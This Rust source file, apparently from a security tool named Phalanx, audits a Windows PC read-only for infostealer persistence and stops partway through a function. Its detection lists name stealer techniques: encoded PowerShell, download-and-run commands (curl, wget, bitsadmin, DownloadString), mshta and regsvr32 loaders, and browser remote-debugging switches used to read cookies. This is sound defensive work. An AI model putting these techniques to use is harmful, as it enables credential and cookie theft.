//! Stealer and persistence audit: a read-only look for what infostealers and
//! the loaders that install them leave behind.
//!
//! An infostealer copies the browser's cookie and password stores, often
//! once, and may leave a loader that runs again at sign-in. This audit lists
//! the places such programs use to come back, and flags what looks wrong:
//!
//! * start-up entries (Run keys, Startup folders), scheduled tasks and
//!   services whose program is unsigned, in a user-writable folder, missing,
//!   or a script host running encoded or downloaded code;
//! * browser shortcuts and launch commands that add remote-debugging or
//!   extension-loading switches (used to read Chrome's cookies);
//! * browser policies that force-install extensions;
//! * a proxy or hosts-file entries that reroute traffic;
//! * Microsoft Defender exclusions (read separately, as administrator).
//!
//! Each program found is also scanned with the local engine. Nothing is
//! changed; removing persistence is left to the user, with the location shown.

use crate::engine::Engine;
use crate::Finding;
use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};
use std::time::Duration;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    /// Listed for completeness; nothing wrong seen.
    Info,
    Low,
    Medium,
    High,
}

impl Severity {
    pub fn label(self) -> &'static str {
        match self {
            Severity::Info => "OK",
            Severity::Low => "Low",
            Severity::Medium => "Review",
            Severity::High => "High",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Kind {
    StartupEntry,
    ScheduledTask,
    Service,
    BrowserShortcut,
    BrowserPolicy,
    Proxy,
    HostsFile,
    DefenderExclusion,
}

impl Kind {
    pub fn label(self) -> &'static str {
        match self {
            Kind::StartupEntry => "Start-up entry",
            Kind::ScheduledTask => "Scheduled task",
            Kind::Service => "Service",
            Kind::BrowserShortcut => "Browser shortcut",
            Kind::BrowserPolicy => "Browser policy",
            Kind::Proxy => "Proxy",
            Kind::HostsFile => "Hosts file",
            Kind::DefenderExclusion => "Defender exclusion",
        }
    }
}

/// Authenticode state of a program, as Windows reports it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(tag = "state", rename_all = "snake_case")]
pub enum Signature {
    /// Valid signature; the signer's name.
    Signed { signer: String },
    /// No signature.
    Unsigned,
    /// A signature that does not verify (tampered, expired, untrusted).
    Invalid { status: String },
    /// Not checked (the program could not be found or read).
    Unknown,
}

#[derive(Debug, Clone, Serialize)]
pub struct AuditItem {
    pub severity: Severity,
    pub kind: Kind,
    /// Short name: the entry, task or service name, or the file name.
    pub title: String,
    /// Where it was found (registry key, folder, task path).
    pub location: String,
    /// The command or value as stored.
    pub command: String,
    /// The program it starts, when one could be identified.
    pub program: Option<PathBuf>,
    pub signature: Signature,
    /// Why it was flagged, most important first. Empty when nothing was wrong.
    pub reasons: Vec<String>,
    /// Local engine matches on the program.
    pub detections: Vec<Finding>,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct AuditReport {
    pub items: Vec<AuditItem>,
    /// Parts that could not be read, with the reason.
    pub errors: Vec<String>,
    pub elapsed_ms: u128,
}

impl AuditReport {
    pub fn count(&self, severity: Severity) -> usize {
        self.items.iter().filter(|i| i.severity == severity).count()
    }
}

// ---------------------------------------------------------------------------
// Collection
// ---------------------------------------------------------------------------

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct Raw {
    run: Vec<RawRun>,
    startup: Vec<RawLink>,
    tasks: Vec<RawTask>,
    services: Vec<RawService>,
    shortcuts: Vec<RawLink>,
    #[serde(rename = "tasksError")]
    tasks_error: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct RawRun {
    key: String,
    name: String,
    command: String,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct RawLink {
    file: String,
    target: String,
    args: String,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct RawTask {
    name: String,
    path: String,
    state: String,
    execute: String,
    args: String,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct RawService {
    name: String,
    display: String,
    path: String,
    start: String,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct RawSignature {
    path: String,
    status: String,
    signer: String,
}

/// PowerShell's single-element arrays come back as objects; accept both.
fn one_or_many<'de, D: serde::Deserializer<'de>, T: Deserialize<'de>>(d: D) -> Result<Vec<T>, D::Error> {
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum OneOrMany<T> {
        Many(Vec<T>),
        One(T),
    }
    Ok(match Option::<OneOrMany<T>>::deserialize(d)? {
        Some(OneOrMany::Many(v)) => v,
        Some(OneOrMany::One(v)) => vec![v],
        None => Vec::new(),
    })
}

#[derive(Deserialize)]
struct Signatures(#[serde(deserialize_with = "one_or_many")] Vec<RawSignature>);

const COLLECT_SCRIPT: &str = r#"
$ErrorActionPreference = 'SilentlyContinue'
$r = @{}
$keys = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run', 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce', 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run', 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce', 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run', 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
$r.run = @(foreach ($k in $keys) { $i = Get-Item -LiteralPath $k; if ($i) { foreach ($n in $i.GetValueNames()) { if ($n) { @{ key = $k; name = $n; command = [string]$i.GetValue($n, $null, 'DoNotExpandEnvironmentNames') } } } } })
$ws = New-Object -ComObject WScript.Shell
function Links($dirs, $depth, $filter) { foreach ($d in $dirs) { if ($d -and (Test-Path -LiteralPath $d)) { Get-ChildItem -LiteralPath $d -Recurse -Depth $depth -Force -File -Filter $filter | ForEach-Object { $t = ''; $a = ''; if ($_.Extension -eq '.lnk') { $s = $ws.CreateShortcut($_.FullName); $t = [string]$s.TargetPath; $a = [string]$s.Arguments }; @{ file = $_.FullName; target = $t; args = $a } } } } }
$r.startup = @(Links @([Environment]::GetFolderPath('Startup'), [Environment]::GetFolderPath('CommonStartup')) 0 '*')
$browsers = '(?i)\\(chrome|msedge|brave|vivaldi|opera|launcher|firefox)\.exe$'
$r.shortcuts = @((Links @([Environment]::GetFolderPath('Desktop'), [Environment]::GetFolderPath('CommonDesktopDirectory'), (Join-Path $env:APPDATA 'Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar')) 0 '*.lnk') + (Links @([Environment]::GetFolderPath('Programs'), [Environment]::GetFolderPath('CommonPrograms')) 3 '*.lnk') | Where-Object { $_.target -match $browsers })
try { $r.tasks = @(Get-ScheduledTask -ErrorAction Stop | Where-Object { $_.TaskPath -notlike '\Microsoft\*' } | ForEach-Object { $t = $_; @($t.Actions) | Where-Object { $_.Execute } | ForEach-Object { @{ name = $t.TaskName; path = $t.TaskPath; state = [string]$t.State; execute = [string]$_.Execute; args = [string]$_.Arguments } } }) } catch { $r.tasksError = $_.Exception.Message }
$r.services = @(Get-CimInstance Win32_Service | ForEach-Object { @{ name = [string]$_.Name; display = [string]$_.DisplayName; path = [string]$_.PathName; start = [string]$_.StartMode } })
$r | ConvertTo-Json -Depth 5 -Compress
"#;

/// Runs the audit. `engine` scans each program found; `exclusions` is the
/// result of [`read_defender_exclusions`] when the user allowed it.
pub fn run(engine: Option<&Engine>, exclusions: Option<&DefenderExclusions>, work_dir: &Path) -> AuditReport {
    let started = std::time::Instant::now();
    let mut report = AuditReport::default();
    let env = Env::current();

    let raw: Raw = match crate::system::powershell_json(COLLECT_SCRIPT, Duration::from_secs(120)) {
        Ok(raw) => raw,
        Err(e) => {
            report.errors.push(format!("start-up entries, tasks and services: {e}"));
            Raw::default()
        }
    };
    if let Some(e) = &raw.tasks_error {
        report.errors.push(format!("scheduled tasks: {e}"));
    }

    let mut items = Vec::new();
    for r in &raw.run {
        let hive = if r.key.starts_with("HKLM") { "all users" } else { "this user" };
        items.push(item(Kind::StartupEntry, &r.name, &format!("{} ({hive})", r.key), &r.command, &env));
    }
    for l in &raw.startup {
        let name = file_name(&l.file);
        let command = if l.target.is_empty() { quote(&l.file) } else { format!("{} {}", quote(&l.target), l.args) };
        items.push(item(Kind::StartupEntry, &name, &parent(&l.file), command.trim(), &env));
    }
    for t in &raw.tasks {
        let mut it = item(Kind::ScheduledTask, &t.name, &format!("Task Scheduler {}", t.path), &format!("{} {}", quote(&t.execute), t.args).trim().to_string(), &env);
        if t.state.eq_ignore_ascii_case("disabled") {
            it.reasons.push("the task is disabled".into());
        }
        items.push(it);
    }
    for s in &raw.services {
        let mut it = item(Kind::Service, &s.display, &format!("service {} (start: {})", s.name, s.start), &s.path, &env);
        // Windows' own services are numerous and signed by catalog; only
        // list a service when something about it stands out.
        if it.program.as_deref().is_some_and(|p| env.is_windows_dir(p)) && it.reasons.is_empty() {
            continue;
        }
        it.title = format!("{} ({})", s.display, s.name);
        items.push(it);
    }
    for l in &raw.shortcuts {
        let command = format!("{} {}", quote(&l.target), l.args);
        let mut it = item(Kind::BrowserShortcut, &file_name(&l.file), &parent(&l.file), command.trim(), &env);
        it.program = Some(PathBuf::from(&l.target));
        // Only worth listing when the switches are wrong.
        if browser_switches(&l.args).is_empty() {
            continue;
        }
        items.push(it);
    }
    items.extend(browser_policies(&mut report.errors));
    items.extend(proxy_items());
    items.extend(hosts_items(&env));
    if let Some(ex) = exclusions {
        items.extend(exclusion_items(ex, &env));
    }

    // Signatures for every program found, in one PowerShell call.
    let programs: BTreeSet<PathBuf> = items.iter().filter_map(|i| i.program.clone()).filter(|p| p.is_file()).collect();
    match signatures(&programs, work_dir) {
        Ok(sigs) => {
            for it in items.iter_mut() {
                if let Some(p) = &it.program {
                    if let Some(sig) = sigs.iter().find(|s| Path::new(&s.path) == p.as_path()) {
                        it.signature = parse_signature(sig);
                    }
                }
            }
        }
        Err(e) => report.errors.push(format!("signature checks: {e}")),
    }

    for it in items.iter_mut() {
        let trusted = matches!(it.signature, Signature::Signed { .. });
        if let (Some(engine), Some(path), false) = (engine, it.program.clone(), trusted) {
            if let Some(data) = read_limited(&path) {
                it.detections = engine.scanner().scan(&data).findings;
            }
        }
        rate(it, &env);
    }
    if let Some(own_dir) = std::env::current_exe().ok().and_then(|p| p.parent().map(Path::to_path_buf)) {
        for it in items.iter_mut().filter(|i| i.program.as_deref().and_then(Path::parent) == Some(own_dir.as_path()) && i.detections.is_empty()) {
            it.severity = Severity::Info;
            it.reasons = vec!["Phalanx itself".into()];
        }
    }
    items.sort_by(|a, b| b.severity.cmp(&a.severity).then_with(|| a.kind.label().cmp(b.kind.label())).then_with(|| a.title.cmp(&b.title)));
    report.items = items;
    report.elapsed_ms = started.elapsed().as_millis();
    report
}

fn read_limited(path: &Path) -> Option<Vec<u8>> {
    use std::io::Read;
    let mut data = Vec::new();
    std::fs::File::open(path).ok()?.take(64 * 1024 * 1024).read_to_end(&mut data).ok()?;
    Some(data)
}

fn signatures(programs: &BTreeSet<PathBuf>, work_dir: &Path) -> Result<Vec<RawSignature>, String> {
    if programs.is_empty() {
        return Ok(Vec::new());
    }
    // Paths go through a file: no quoting, no command-line length limit.
    std::fs::create_dir_all(work_dir).map_err(|e| e.to_string())?;
    let list = work_dir.join("audit-paths.json");
    let paths: Vec<String> = programs.iter().map(|p| p.display().to_string()).collect();
    std::fs::write(&list, serde_json::to_vec(&paths).map_err(|e| e.to_string())?).map_err(|e| e.to_string())?;
    let script = format!(
        r#"$ErrorActionPreference = 'SilentlyContinue'
$paths = Get-Content -Raw -Encoding UTF8 -LiteralPath '{}' | ConvertFrom-Json
@($paths | ForEach-Object {{ $s = Get-AuthenticodeSignature -LiteralPath $_; @{{ path = $_; status = [string]$s.Status; signer = [string]$s.SignerCertificate.Subject }} }}) | ConvertTo-Json -Depth 3 -Compress"#,
        list.display().to_string().replace('\'', "''")
    );
    let result = crate::system::powershell_json::<Signatures>(&script, Duration::from_secs(180)).map(|s| s.0);
    let _ = std::fs::remove_file(&list);
    result
}

fn parse_signature(raw: &RawSignature) -> Signature {
    match raw.status.as_str() {
        "Valid" => Signature::Signed { signer: signer_name(&raw.signer) },
        "NotSigned" => Signature::Unsigned,
        "" => Signature::Unknown,
        other => Signature::Invalid { status: other.to_string() },
    }
}

/// `CN=Google LLC, O=Google LLC, …` → `Google LLC`.
fn signer_name(subject: &str) -> String {
    subject
        .split(", ")
        .find_map(|part| part.strip_prefix("CN="))
        .map(|cn| cn.trim_matches('"').to_string())
        .unwrap_or_else(|| subject.to_string())
}

fn item(kind: Kind, title: &str, location: &str, command: &str, env: &Env) -> AuditItem {
    let parsed = parse_command(command, env);
    let mut reasons = Vec::new();
    if let Some(host) = &parsed.host {
        reasons.extend(script_reasons(host, &parsed.args));
    }
    AuditItem {
        severity: Severity::Info,
        kind,
        title: if title.is_empty() { command.to_string() } else { title.to_string() },
        location: location.to_string(),
        command: command.to_string(),
        program: parsed.subject.or(parsed.program),
        signature: Signature::Unknown,
        reasons,
        detections: Vec::new(),
    }
}

// ---------------------------------------------------------------------------
// Rating
// ---------------------------------------------------------------------------

/// Decides the severity from everything known about an item.
fn rate(it: &mut AuditItem, env: &Env) {
    let mut severity = Severity::Info;
    let mut bump = |s: Severity| severity = severity.max(s);

    if let Some(d) = it.detections.first() {
        it.reasons.insert(0, format!("Phalanx detects it as {} ({})", d.threat, d.category));
        bump(Severity::High);
    }
    // Reasons already present come from the item's own collector: script
    // hosts running hidden, encoded or downloaded code, browser switches,
    // policies, proxies, hosts entries and exclusions.
    if !it.reasons.is_empty() && it.detections.is_empty() {
        bump(match it.kind {
            Kind::BrowserShortcut | Kind::BrowserPolicy => Severity::High,
            Kind::HostsFile | Kind::Proxy | Kind::DefenderExclusion => Severity::Medium,
            _ if it.reasons.iter().any(|r| r.contains("encoded") || r.contains("downloads")) => Severity::High,
            _ if it.reasons.iter().all(|r| r == "the task is disabled") => Severity::Info,
            _ => Severity::Medium,
        });
    }
    if it.kind == Kind::BrowserShortcut {
        let switches = browser_switches(it.command.split_once(' ').map_or("", |(_, a)| a));
        it.reasons.extend(switches.iter().map(|s| format!("starts the browser with {s}, which lets another program read its cookies and passwords")));
        if !switches.is_empty() {
            bump(Severity::High);
        }
    }
    if let Some(path) = it.program.clone() {
        let exists = path.is_file() || std::fs::symlink_metadata(&path).is_ok();
        let writable = env.user_writable(&path);
        match (&it.signature, exists) {
            (_, false) if matches!(it.kind, Kind::StartupEntry | Kind::ScheduledTask | Kind::Service) => {
                it.reasons.push("the program it starts no longer exists".into());
                bump(Severity::Low);
            }
            (Signature::Unsigned, true) if writable => {
                it.reasons.push(format!("unsigned program in a folder any program can write to ({})", short_dir(&path)));
                bump(Severity::Medium);
            }
            (Signature::Invalid { status }, true) => {
                it.reasons.push(format!("its digital signature does not verify ({status})"));
                bump(if writable { Severity::High } else { Severity::Medium });
            }
            (Signature::Unsigned, true) => {
                it.reasons.push("unsigned program".into());
                bump(Severity::Low);
            }
            _ => {}
        }
        if exists && env.is_temp(&path) && matches!(it.kind, Kind::StartupEntry | Kind::ScheduledTask | Kind::Service) {
            it.reasons.push("starts a program from a temporary folder".into());
            bump(Severity::Medium);
        }
    }
    it.severity = severity;
}

/// Script hosts and the arguments that make them suspicious.
fn script_reasons(host: &str, args: &str) -> Vec<String> {
    let a = args.to_ascii_lowercase();
    let mut out = Vec::new();
    let has = |needles: &[&str]| needles.iter().any(|n| a.contains(n));
    if has(&[" -enc ", " -e ", "-encodedcommand", "frombase64string", " -ec "]) || a.starts_with("-e ") || a.starts_with("-enc ") {
        out.push(format!("{host} runs encoded (hidden) code"));
    }
    if has(&["http://", "https://", "downloadstring", "downloadfile", "invoke-webrequest", "iwr ", "curl ", "wget ", "bitsadmin", "urlcache", "net.webclient"]) {
        out.push(format!("{host} downloads and runs code from the internet"));
    }
    if has(&["iex", "invoke-expression"]) && !out.iter().any(|r| r.contains("encoded")) {
        out.push(format!("{host} runs code built at run time (Invoke-Expression)"));
    }
    if has(&["-w hidden", "-windowstyle hidden", "-win hidden", "-windowstyle 1"]) {
        out.push(format!("{host} runs in a hidden window"));
    }
    if host == "mshta" || (host == "regsvr32" && has(&["/i:http", "scrobj"])) {
        out.push(format!("{host} is a common way to run downloaded scripts"));
    }
    out
}

/// Switches that let another program control the browser or read its data.
pub fn browser_switches(args: &str) -> Vec<String> {
    let a = args.to_ascii_lowercase();
    ["--remote-debugging-port", "--remote-debugging-pipe", "--remote-allow-origins", "--load-extension", "--disable-extensions-except", "--user-data-dir"]
        .iter()
        // A separate --user-data-dir alone is how people run a second profile; only
        // suspicious next to the others.
        .filter(|s| a.contains(*s) && (**s != "--user-data-dir" || a.contains("--remote-debugging")))
        .map(|s| s.to_string())
        .collect()
}

// ---------------------------------------------------------------------------
// Command lines
// ---------------------------------------------------------------------------

#[derive(Debug, Default, PartialEq)]
struct Command {
    /// The program the command line starts.
    program: Option<PathBuf>,
    /// For script hosts and loaders: their name.
    host: Option<String>,
    /// For script hosts and loaders: the file they run, when it is a file.
    subject: Option<PathBuf>,
    args: String,
}

const HOSTS: &[&str] = &["powershell", "pwsh", "cmd", "wscript", "cscript", "mshta", "rundll32", "regsvr32", "python", "pythonw", "node", "conhost"];

fn parse_command(command: &str, env: &Env) -> Command {
    let expanded = env.expand(command.trim());
    let (program, args) = split_program(&expanded, env);
    let mut out = Command { program: program.clone(), args: args.clone(), ..Default::default() };
    let stem = program
        .as_ref()
        .and_then(|p| p.file_stem())
        .map(|s| s.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();
    if HOSTS.contains(&stem.as_str()) {
        out.host = Some(stem);
        // The first argument that names an existing file is what it runs
        // (`rundll32 C:\x.dll,Entry`, `wscript C:\a.vbs`, `powershell -File x.ps1`).
        out.subject = tokens(&args)
            .into_iter()
            .map(|t| t.split(',').next().unwrap_or("").to_string())
            .map(PathBuf::from)
            .find(|p| p.is_absolute() && p.is_file());
    }
    out
}

/// The program and the rest of a command line. Handles quoted paths and
/// unquoted paths with spaces (`C:\Program Files\App\app.exe -x`).
fn split_program(command: &str, env: &Env) -> (Option<PathBuf>, String) {
    let command = command.trim();
    if let Some(rest) = command.strip_prefix('"') {
        if let Some((program, args)) = rest.split_once('"') {
            return (Some(env.resolve(program)), args.trim().to_string());
        }
    }
    let parts: Vec<&str> = command.split(' ').collect();
    for end in (1..=parts.len()).rev() {
        let candidate = parts[..end].join(" ");
        let path = env.resolve(&candidate);
        if path.is_file() {
            return (Some(path), parts[end..].join(" ").trim().to_string());
        }
    }
    match parts.first() {
        Some(first) if !first.is_empty() => (Some(env.resolve(first)), parts[1..].join(" ").trim().to_string()),
        _ => (None, String::new()),
    }
}

/// Splits arguments on spaces, keeping quoted parts together.
fn tokens(args: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut current = String::new();
    let mut quoted = false;
    for c in args.chars() {
        match c {
            '"' => quoted = !quoted,
            ' ' if !quoted => {
                if !current.is_empty() {
                    out.push(std::mem::take(&mut current));
                }
            }
            _ => current.push(c),
        }
    }
    if !current.is_empty() {
        out.push(current);
    }
    out
}

/// The environment the paths are interpreted in.
struct Env {
    vars: Vec<(String, String)>,
    windows: PathBuf,
    writable: Vec<PathBuf>,
    temp: Vec<PathBuf>,
}

impl Env {
    fn current() -> Self {
        let var = |name: &str| std::env::var(name).ok().filter(|v| !v.is_empty());
        let vars: Vec<(String, String)> = std::env::vars().map(|(k, v)| (k.to_ascii_lowercase(), v)).collect();
        let windows = PathBuf::from(var("SystemRoot").unwrap_or_else(|| r"C:\Windows".into()));
        let mut writable: Vec<PathBuf> = ["APPDATA", "LOCALAPPDATA", "TEMP", "TMP", "PUBLIC", "ProgramData"].iter().filter_map(|n| var(n)).map(PathBuf::from).collect();
        if let Some(home) = var("USERPROFILE") {
            for sub in ["Downloads", "Desktop", "Documents", "Music", "Pictures", "Videos"] {
                writable.push(PathBuf::from(&home).join(sub));
            }
        }
        writable.push(windows.join("Temp"));
        let temp = ["TEMP", "TMP"].iter().filter_map(|n| var(n)).map(PathBuf::from).chain(Some(windows.join("Temp"))).collect();
        Self { vars, windows, writable, temp }
    }

    /// `%SystemRoot%\x` → `C:\Windows\x`; unknown variables are kept.
    fn expand(&self, text: &str) -> String {
        let mut out = String::new();
        let mut rest = text;
        while let Some(start) = rest.find('%') {
            out.push_str(&rest[..start]);
            let after = &rest[start + 1..];
            match after.find('%') {
                Some(end) => {
                    let name = after[..end].to_ascii_lowercase();
                    match self.vars.iter().find(|(k, _)| *k == name) {
                        Some((_, v)) => out.push_str(v),
                        None => out.push_str(&rest[start..start + end + 2]),
                    }
                    rest = &after[end + 1..];
                }
                None => {
                    out.push_str(&rest[start..]);
                    rest = "";
                }
            }
        }
        out.push_str(rest);
        out
    }

    /// A program name as Windows would find it: as given, with `.exe`, or in
    /// System32 (`rundll32` → `C:\Windows\System32\rundll32.exe`).
    fn resolve(&self, program: &str) -> PathBuf {
        let program = program.trim().trim_matches('"');
        let path = PathBuf::from(program);
        // `\??\C:\…` and `\SystemRoot\…` appear in service paths.
        let path = match program {
            p if p.starts_with(r"\??\") => PathBuf::from(&p[4..]),
            p if p.to_ascii_lowercase().starts_with(r"\systemroot\") => self.windows.join(&p[12..]),
            p if p.to_ascii_lowercase().starts_with(r"system32\") => self.windows.join(p),
            _ => path,
        };
        if path.is_file() {
            return path;
        }
        let with_exe = if path.extension().is_none() { path.with_extension("exe") } else { path.clone() };
        if with_exe.is_file() {
            return with_exe;
        }
        if !path.is_absolute() {
            let in_system = self.windows.join("System32").join(&with_exe);
            if in_system.is_file() {
                return in_system;
            }
        }
        path
    }

    fn user_writable(&self, path: &Path) -> bool {
        let p = lower(path);
        self.writable.iter().any(|d| p.starts_with(&lower(d)))
    }

    fn is_temp(&self, path: &Path) -> bool {
        let p = lower(path);
        self.temp.iter().any(|d| p.starts_with(&lower(d)))
    }

    fn is_windows_dir(&self, path: &Path) -> bool {
        lower(path).starts_with(&lower(&self.windows))
    }
}

fn lower(path: &Path) -> String {
    let mut s = path.display().to_string().to_ascii_lowercase().replace('/', "\\");
    if !s.ends_with('\\') {
        s.push('\\');
    }
    s
}

/// A program path ready to put on a command line: any quotes it already has
/// are removed first, so `"C:\x.exe"` is not quoted twice.
fn quote(path: &str) -> String {
    let path = path.trim().trim_matches('"');
    if path.contains(' ') {
        format!("\"{path}\"")
    } else {
        path.to_string()
    }
}

fn file_name(path: &str) -> String {
    Path::new(path).file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_else(|| path.to_string())
}

fn parent(path: &str) -> String {
    Path::new(path).parent().map(|p| p.display().to_string()).unwrap_or_default()
}

fn short_dir(path: &Path) -> String {
    path.parent().map(|p| p.display().to_string()).unwrap_or_default()
}

// ---------------------------------------------------------------------------
// Browser policies, proxy, hosts file
// ---------------------------------------------------------------------------

/// `ExtensionInstallForcelist` entries: extensions a policy installs that
/// the user cannot remove. Common in managed PCs; on a personal PC, a sign
/// that malware installed an extension.
fn browser_policies(#[cfg_attr(windows, allow(unused_variables))] errors: &mut Vec<String>) -> Vec<AuditItem> {
    #[cfg(windows)]
    {
        use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
        use winreg::RegKey;
        let mut out = Vec::new();
        for (browser, key) in [
            ("Chrome", r"Software\Policies\Google\Chrome"),
            ("Edge", r"Software\Policies\Microsoft\Edge"),
            ("Brave", r"Software\Policies\BraveSoftware\Brave"),
        ] {
            for (hive_name, hive) in [("HKLM", HKEY_LOCAL_MACHINE), ("HKCU", HKEY_CURRENT_USER)] {
                let path = format!(r"{key}\ExtensionInstallForcelist");
                let Ok(list) = RegKey::predef(hive).open_subkey(&path) else { continue };
                for (name, value) in list.enum_values().flatten() {
                    let text = value.to_string();
                    let id = text.split(';').next().unwrap_or(&text).to_string();
                    out.push(AuditItem {
                        severity: Severity::Info,
                        kind: Kind::BrowserPolicy,
                        title: format!("{browser} force-installs extension {id}"),
                        location: format!(r"{hive_name}\{path} ({name})"),
                        command: text.clone(),
                        program: None,
                        signature: Signature::Unknown,
                        reasons: vec![
                            "a policy installs this extension and stops you from removing it; malware uses this to keep a data-stealing extension in your browser (fine if your PC is managed by work or school)".into(),
                        ],
                        detections: Vec::new(),
                    });
                }
            }
        }
        out
    }
    #[cfg(not(windows))]
    {
        errors.push("browser policies: only on Windows".into());
        Vec::new()
    }
}

fn proxy_items() -> Vec<AuditItem> {
    #[cfg(windows)]
    {
        use winreg::{enums::HKEY_CURRENT_USER, RegKey};
        let Ok(key) = RegKey::predef(HKEY_CURRENT_USER).open_subkey(r"Software\Microsoft\Windows\CurrentVersion\Internet Settings") else {
            return Vec::new();
        };
        let mut out = Vec::new();
        let mk = |title: String, command: String, reason: &str| AuditItem {
            severity: Severity::Info,
            kind: Kind::Proxy,
            title,
            location: r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings".into(),
            command,
            program: None,
            signature: Signature::Unknown,
            reasons: vec![reason.to_string()],
            detections: Vec::new(),
        };
        let enabled = key.get_value::<u32, _>("ProxyEnable").unwrap_or(0) == 1;
        let server: String = key.get_value("ProxyServer").unwrap_or_default();
        if enabled && !server.is_empty() && !is_local_proxy(&server) {
            out.push(mk(format!("Proxy {server}"), server.clone(), "web traffic is sent through a proxy; malware sets one to read or change what you browse"));
        }
        let pac: String = key.get_value("AutoConfigURL").unwrap_or_default();
        if !pac.is_empty() {
            out.push(mk(format!("Proxy script {pac}"), pac.clone(), "a proxy script decides where web traffic goes; malware uses one to redirect sites"));
        }
        out
    }
    #[cfg(not(windows))]
    Vec::new()
}

/// A proxy on this PC (developer tools, some security products).
fn is_local_proxy(server: &str) -> bool {
    server.split(';').all(|s| {
        let host = s.rsplit('=').next().unwrap_or(s);
        host.starts_with("127.") || host.starts_with("localhost") || host.starts_with("[::1]")
    })
}

/// Sites whose redirection or blocking is a hallmark of malware.
const SENSITIVE_HOSTS: &[&str] = &[
    "google.com", "accounts.google.com", "gmail.com", "microsoft.com", "live.com", "login.microsoftonline.com",
    "windowsupdate.com", "update.microsoft.com", "defender.microsoft.com", "wdcp.microsoft.com", "steampowered.com",
    "steamcommunity.com", "discord.com", "facebook.com", "instagram.com", "reddit.com", "x.com", "twitter.com",
    "paypal.com", "apple.com", "github.com", "malwarebytes.com", "virustotal.com", "kaspersky.com", "avast.com",
];

fn hosts_items(env: &Env) -> Vec<AuditItem> {
    let path = env.windows.join(r"System32\drivers\etc\hosts");
    let Ok(text) = std::fs::read_to_string(&path) else { return Vec::new() };
    hosts_findings(&text, &path.display().to_string())
}

fn hosts_findings(text: &str, location: &str) -> Vec<AuditItem> {
    let mut out = Vec::new();
    for line in text.lines() {
        let line = line.split('#').next().unwrap_or("").trim();
        let mut parts = line.split_whitespace();
        let (Some(addr), names) = (parts.next(), parts.collect::<Vec<_>>()) else { continue };
        for name in names {
            let name = name.to_ascii_lowercase();
            if name == "localhost" || name.ends_with(".localhost") || name.ends_with(".local") || !name.contains('.') {
                continue;
            }
            let sensitive = SENSITIVE_HOSTS.iter().any(|h| name == *h || name.ends_with(&format!(".{h}")));
            let blocked = matches!(addr, "0.0.0.0" | "127.0.0.1" | "::1" | "::");
            if !sensitive && blocked {
                continue; // ordinary ad/tracker blocking
            }
            let reason = match (sensitive, blocked) {
                (true, true) => format!("{name} is blocked; malware blocks security and account sites so you cannot get help or updates"),
                (true, false) => format!("{name} is sent to {addr} instead of the real site, a way to steal sign-ins"),
                _ => format!("{name} is sent to {addr} instead of where it normally goes"),
            };
            out.push(AuditItem {
                severity: if sensitive { Severity::High } else { Severity::Info },
                kind: Kind::HostsFile,
                title: format!("{name} → {addr}"),
                location: location.to_string(),
                command: line.to_string(),
                program: None,
                signature: Signature::Unknown,
                reasons: vec![reason],
                detections: Vec::new(),
            });
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Defender exclusions (administrator)
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(default)]
pub struct DefenderExclusions {
    #[serde(deserialize_with = "one_or_many")]
    pub paths: Vec<String>,
    #[serde(deserialize_with = "one_or_many")]
    pub processes: Vec<String>,
    #[serde(deserialize_with = "one_or_many")]
    pub extensions: Vec<String>,
}

/// Microsoft Defender's exclusions can only be read as administrator, so this
/// asks Windows for permission (the UAC prompt) and has the elevated, read-only
/// command write them to a file in `work_dir`. `Ok(None)`: the user declined.
pub fn read_defender_exclusions(work_dir: &Path) -> anyhow::Result<Option<DefenderExclusions>> {
    std::fs::create_dir_all(work_dir)?;
    let out = work_dir.join("defender-exclusions.json");
    let _ = std::fs::remove_file(&out);
    let script = format!(
        "$p = Get-MpPreference; @{{ paths = @($p.ExclusionPath | Where-Object {{ $_ }}); processes = @($p.ExclusionProcess | Where-Object {{ $_ }}); extensions = @($p.ExclusionExtension | Where-Object {{ $_ }}) }} | ConvertTo-Json -Compress | Set-Content -Encoding UTF8 -LiteralPath '{}'",
        out.display().to_string().replace('\'', "''")
    );
    match crate::system::run_elevated_powershell(&format!("$ErrorActionPreference = 'Stop'; try {{ {script}; exit 0 }} catch {{ exit 1 }}"))? {
        crate::system::Elevated::Declined => Ok(None),
        crate::system::Elevated::Exited(0) => {
            let text = std::fs::read_to_string(&out)?;
            let _ = std::fs::remove_file(&out);
            Ok(Some(serde_json::from_str(text.trim_start_matches('\u{feff}'))?))
        }
        crate::system::Elevated::Exited(code) => anyhow::bail!("reading the exclusions failed (exit code {code})"),
    }
}

fn exclusion_items(ex: &DefenderExclusions, env: &Env) -> Vec<AuditItem> {
    let mut out = Vec::new();
    let mut add = |kind: &str, value: &str, severity: Severity, reason: String| {
        out.push(AuditItem {
            severity,
            kind: Kind::DefenderExclusion,
            title: format!("{kind} excluded: {value}"),
            location: "Microsoft Defender exclusions".into(),
            command: value.to_string(),
            program: None,
